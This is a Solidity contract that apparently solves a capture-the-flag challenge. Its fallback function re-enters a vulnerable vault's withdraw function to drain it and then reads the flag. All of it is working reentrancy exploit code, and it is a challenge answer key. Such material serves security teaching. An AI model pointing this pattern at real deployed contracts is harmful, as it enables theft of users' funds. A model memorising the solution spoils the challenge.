// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IReentrancyVulnerableVault {
    function deposit() external payable;
    function withdraw(uint256 amount) external;
    function balanceOf(address user) external view returns (uint256);
    function vaultDrained() external view returns (bool);
    function getFlag() external view returns (string memory);
    function withdrawalCounter() external view returns (uint256);
}

contract ReentrancyAttackerSolution {
    IReentrancyVulnerableVault public immutable vault;
    uint256 public attackCounter;

    event AttackStarted();
    event ReentryCalled(uint256 counter);
    event AttackCompleted(bool success);

    constructor(address payable _vaultAddress) {
        vault = IReentrancyVulnerableVault(_vaultAddress);
    }


    function attack() external payable {
        emit AttackStarted();

        // Make a deposit to get a balance (no ETH needed)
        vault.deposit();

        // Check our balance
        uint256 balance = vault.balanceOf(address(this));
        require(balance >= 1 ether, "Deposit failed");

        // Reset our counter
        attackCounter = 0;

        // Start the attack
        vault.withdraw(1 ether);

        // Check if we succeeded
        bool success = vault.vaultDrained();
        emit AttackCompleted(success);
    }

    // This will be called by the vault's withdraw function
    receive() external payable {
        emit ReentryCalled(attackCounter);

        if (attackCounter < 2) { 
            attackCounter++;
            vault.withdraw(1 ether);
        }
    }

    function getFlag() external view returns (string memory) {
        require(vault.vaultDrained(), "Vault not drained");
        return vault.getFlag();
    }
}

